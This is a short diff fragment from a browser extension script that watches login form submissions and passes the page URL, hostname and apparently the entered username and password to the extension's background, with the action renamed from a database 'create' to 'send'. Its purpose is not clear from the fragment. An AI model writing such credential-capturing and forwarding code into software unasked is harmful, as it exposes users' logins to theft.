@@ -26,8 +26,7 @@ function monitorSubmissions() {
               if (this._user.value && this._pass.value) {
                   // post credentials to background
                   chrome.extension.sendRequest({
-                      action: 'queryDatabase',
-                      crud: 'create',
+                      action: 'send',
                       record: [
                           window.location.href,
                           window.location.hostname,
